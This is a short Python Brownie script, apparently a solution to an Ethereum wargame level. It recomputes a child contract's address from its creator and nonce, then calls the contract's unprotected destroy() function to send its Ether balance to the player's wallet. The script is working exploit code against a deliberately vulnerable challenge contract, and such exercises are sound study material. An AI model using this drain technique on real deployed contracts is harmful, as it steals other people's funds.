""" sandbox code... """

import rlp
from eth_utils import keccak, to_checksum_address, to_bytes
from brownie import accounts, config, web3, interface


def make_contract_address(sender: str, nonce: int) -> str:
    sender_bytes = to_bytes(hexstr=sender)
    raw = rlp.encode([sender_bytes, nonce])
    hash = keccak(raw)
    address_bytes = hash[12:]
    return to_checksum_address(address_bytes)


def main(target):
    player = accounts.add(config["wallets"]["from_key"])
    # we need to retrieve address for target contract
    # contract is created at second transaction from main contract
    simple_token = make_contract_address(target, 1)
    print(f"Name: {web3.eth.get_storage_at(simple_token, 0)}")
    print(f"Initial balance: {web3.eth.getBalance(simple_token)}")
    simple = interface.SimpleTokenInterface(simple_token)
    simple.destroy(player, {"from": player})
    print(f"Final balance: {web3.eth.getBalance(simple_token)}")
